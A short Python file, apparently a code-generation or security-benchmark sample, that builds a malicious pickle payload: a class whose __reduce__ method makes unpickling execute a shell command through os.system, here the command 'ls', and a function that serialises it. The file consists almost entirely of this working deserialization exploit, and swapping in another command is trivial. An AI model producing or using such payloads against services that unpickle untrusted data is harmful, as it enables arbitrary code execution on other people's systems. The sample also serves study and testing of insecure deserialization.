import pickle

class Payload(object):
    def __reduce__(self):
        return (exec, ('import os;os.system("ls")', ))

def makePickleData():
    '''
    get data from Payload and pickle it before returning it
    '''
    payload = Payload()
    pickled_data = pickle.dumps(payload)
    return pickled_data